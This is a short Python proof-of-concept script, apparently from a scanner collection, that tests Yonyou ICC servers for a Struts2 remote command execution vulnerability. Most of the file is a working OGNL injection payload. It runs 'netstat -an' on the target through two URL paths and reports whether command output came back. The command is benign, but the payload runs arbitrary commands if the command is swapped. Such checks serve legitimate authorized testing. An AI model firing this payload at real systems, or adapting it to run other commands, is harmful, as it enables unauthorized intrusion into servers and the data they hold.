#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 用友ICC struts2远程命令执行
referer: http://www.wooyun.org/bugs/wooyun-2010-023876
author: Lucifer
description: 用友ICC系统存在struts2框架漏洞。
'''
import sys
import requests



class yonyou_icc_struts2_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        payload = "?redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'netstat','-an'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23matt%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()}"
        for turl in [r"/web/icc/chat/chat?c=1&s=1",
                     r"/web/common/doUpload.action"]:
            vulnurl = self.url + turl + payload
            try:
                req = requests.get(vulnurl, timeout=10, verify=False)
                if r"Active Internet connections" in req.text:
                    return "[+]存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Linux]"

                if r"Active Connections" in req.text or r"活动连接" in req.text:
                    return "[+]存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl+"\t[Windows]"

                if r"LISTEN" in req.text:
                    return "[+]可能存在用友struts 命令执行漏洞...(高危)\tpayload: "+vulnurl

            except:
                return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = yonyou_icc_struts2_BaseVerify(sys.argv[1])
    testVuln.run()
